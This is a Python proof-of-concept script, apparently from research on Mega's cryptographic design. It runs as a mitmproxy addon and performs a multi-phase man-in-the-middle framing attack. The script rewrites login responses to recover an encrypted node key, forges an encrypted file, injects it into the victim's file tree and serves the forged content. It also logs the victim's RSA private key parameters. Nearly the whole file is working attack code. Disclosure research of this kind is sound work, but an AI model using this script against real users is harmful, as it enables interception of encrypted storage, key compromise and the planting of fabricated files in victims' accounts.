
#
# This file is part of the PoCs for various issues found in the cryptographic
# design of Mega.
#
# Content: PoC of the framing attack on Mega in a MITM setting.
# This script should be passed as argument to mitmproxy, which then intercepts
# traffic between the victim's browser and Mega, and patches the requests to
# perform the attack.
#

import json
import time
import sys

from mitmproxy import http
from os.path import dirname

# This file is executed directly, which means imports are relative to this
# folder and not the root of this project. Thus, we meddle with the sys.path.
sys.path.append(dirname(dirname(__file__)))

from issue_02.aes_ecb_pt_recovery_attack import MegaAesEcbPlaintextRecoveryAttack

from shared.attack_utils import *
from shared.mega_simulation import *
from shared.constants.mega_crypto import *
from shared.constants.mega_web import *
from shared.constants.victim import *
from shared.constants.mitmproxy import *
from issue_02.aes_ecb_pt_recovery_attack import MegaAesEcbPlaintextRecoveryAttack
from issue_03.framing_attack import MegaFramingAttack


n, e = decode_urlb64_rsa_pubk(VICTIM_PUBK_URL_B64)

## Quick sanity checks
assert n == VICTIM_RSA_P * VICTIM_RSA_Q
assert VICTIM_RSA_D == pow(e, -1, (VICTIM_RSA_P - 1) * (VICTIM_RSA_Q - 1))
assert VICTIM_RSA_U == pow(VICTIM_RSA_Q, -1, VICTIM_RSA_P)

pk = (n, e)
sk = (VICTIM_RSA_Q, VICTIM_RSA_P, VICTIM_RSA_D, VICTIM_RSA_U)

# Attack phases:
## Phase 1: obtaining the node key
## Phase 2: forging a file
## Phase 3: modifying the file tree
## Phase 4: serving the forged file
attack_phase = 1
forged_node = None

def get_json_payload(r):
    try:
        return json.loads(r.text)
    except (json.JSONDecodeError, TypeError):
        return None

def is_json_cmd(d):
    return type(d) == list and hasattr(d[0], "__iter__")

def log_line(l):
    with open(MITMPROXY_LOG_FILE, "a") as log_fp:
        log_fp.write(f"{l}\n")

with open(MITMPROXY_LOG_FILE, "a+") as log_fp:
    now = time.strftime("%Y-%m-%d %H:%M:%S")
    # Don't change this format, the PoC relies on this start header to
    # detect new runs
    log_fp.write(f"Attack start")
    log_fp.write(f"\n-------- start framing attack {now} ----------\n")
    log_fp.write(f"Target user's public key:\n\t- n: {hex(n)}\n\t- e: {hex(e)}\n")
    log_fp.write(f"Target user's private key:" +
        f"\n\t- q: {hex(VICTIM_RSA_Q)}\n\t- p: {hex(VICTIM_RSA_P)}" +
        f"\n\t- d: {hex(VICTIM_RSA_D)}\n\t- u: {hex(VICTIM_RSA_U)}\n")
    log_fp.write(f"\nATTACK PHASE {attack_phase}\n")

decryption_attack = MegaAesEcbPlaintextRecoveryAttack(pk, sk, do_ct_len_encode=True)
framing_attack = MegaFramingAttack()

def request(flow: http.HTTPFlow) -> None:
    global decryption_attack, framing_attack, attack_phase, forged_node

    if attack_phase == 1 and flow.request.method == "POST" \
        and "sid" in flow.request.query:

        # Get decryption of the randomly chosen node key ciphertext
        sid = url_decode(flow.request.query["sid"])
        pt = decryption_attack.recover_pt(sid)
        framing_attack.set_node_key_pt(pt)
        log_line(f"\t- Obtained node key plaintext: {pt.hex()}")

        attack_phase += 1
        log_line(f"\nATTACK PHASE {attack_phase}")

        # immitate server and return a login session invalid response
        flow.response = http.Response.make(
            200,
            b"-15",
            {
                "Content-Type": "application/json",
                "Access-Control-Allow-Origin": "*",
                "Access-Control-Allow-Headers": "Content-Type, MEGA-Chrome-Antileak",
                "Access-Control-Expose-Headers": "Original-Content-Length",
                "Access-Control-Max-Age": "86400",
                "Connection": "keep-alive"
            }
        )

    elif 2 <= attack_phase <= 3 and flow.request.method == "POST":
        d = get_json_payload(flow.request)

        if not d:
            return

        #log_line(f"REQUEST: {d}")

        if attack_phase == 2:
            # XXX: optimization: catch login request and insert csid from before

            if is_json_cmd(d) and "a" in d[0] and d[0]["a"] == "f":
                # This is a request for the file tree!
                log_line("\t- Client requests file tree")

        elif attack_phase == 3:

            if is_json_cmd(d) and "a" in d[0] and d[0]["a"] == "g" \
                and d[0]["n"] == forged_node["h"]:

                log_line(f"Caught request for forged file {flow.request}")
                response = api_file_attr_fetch_response(
                    MEGA_STORAGE_SERVER,
                    forged_node
                )

                attack_phase += 1
                log_line(f"\nATTACK PHASE {attack_phase}")

                flow.response = http.Response.make(
                    200,
                    json.dumps(response).encode(),
                    {
                        "Content-Type": "application/json",
                        "Access-Control-Allow-Origin": "*",
                        "Access-Control-Allow-Headers": "Content-Type, MEGA-Chrome-Antileak",
                        "Access-Control-Expose-Headers": "Original-Content-Length",
                        "Access-Control-Max-Age": "86400",
                        "Connection": "keep-alive"
                    }
                )

    elif attack_phase == 4:
        if MEGA_STORAGE_SERVER_DOMAIN in flow.request.host:
            log_line(f"\nCaught STORAGE request:\n{flow.request}")

            bounds = flow.request.path_components[-1].split("-")
            start = int(bounds[0])
            end = int(bounds[1])

            fc, fc_enc, attr_enc = framing_attack.forged_file

            # Do not change the format of the following line, it is used to
            # detect when the mitmproxy finished it's attack
            log_line(f"Attack done")
            attack_phase += 1

            flow.response = http.Response.make(
                200,
                fc_enc[start:end],
                {
                    "Access-Control-Allow-Headers": "MEGA-Chrome-Antileak",
                    "Access-Control-Allow-Origin": "*",
                    "Access-Control-Max-Age": "86400",
                    "Content-Disposition": "attachment",
                    "Content-Length": str(end - start + 1),
                    "Content-Transfer-Encoding": "binary",
                    "Content-Type": "application/octet-stream",
                }
            )
    else:
        # Don't modify any of the subsequent requests
        return


def response(flow: http.HTTPFlow) -> None:
    global decryption_attack, framing_attack, attack_phase, forged_node

    if flow.response.headers.get(b"Content-Type") == "application/json":
        d = get_json_payload(flow.response)

        if not d:
            return

        if is_json_cmd(d):
            if attack_phase == 1 and "csid" in d[0]:
                # Hijack login attempt to decrypt a randomly chosen node key ciphertext
                csid = url_decode(d[0]["csid"])
                decryption_attack.store_real_csid(d)
                log_line(f"\t- Storing real csid: {csid.hex()}")

                csid_p = decryption_attack.get_special_sid()
                csid_p_encoded = url_encode(csid_p).decode()
                d[0]["csid"] = csid_p_encoded

                # Inject target ciphertext in encrypted secret RSA key
                ct = framing_attack.get_node_key_ct()
                csk = url_decode(d[0]["privk"])
                csk_p = decryption_attack.get_bogus_csk(csk, ct)
                csk_p_enc = url_encode(csk_p)
                d[0]["privk"] = csk_p_enc.decode()
                log_line(f"\t- Injected node key ciphertext for decryption: {ct.hex()}")

                flow.response.text = json.dumps(d)

            if attack_phase == 2 and "ok0" in d[0] and "f" in d[0]:
                # Inject forged file in file tree returned to client

                file_tree = d[0]["f"]

                # Create forged file
                fc, fc_enc, attr_enc = framing_attack.forge_file_ct(FORGE_FILE_NAME)

                # Insert forged file into file tree
                root_handle = api_find_root_node_handle(file_tree)
                owner_handle = api_find_owner_handle(file_tree)
                file_handle = get_new_file_handle()
                forged_node = api_create_file_node(file_handle, root_handle,
                    owner_handle, attr_enc,
                    framing_attack.node_key_ct, framing_attack.file_size,
                    file_attributes=get_pseudo_thumbnail_attr())

                file_tree.append(forged_node)
                d[0]["f"] = file_tree
                log_line("\t- Injected file in fetched file tree")
                attack_phase += 1
                log_line(f"\nATTACK PHASE {attack_phase}")

                flow.response.text = json.dumps(d)
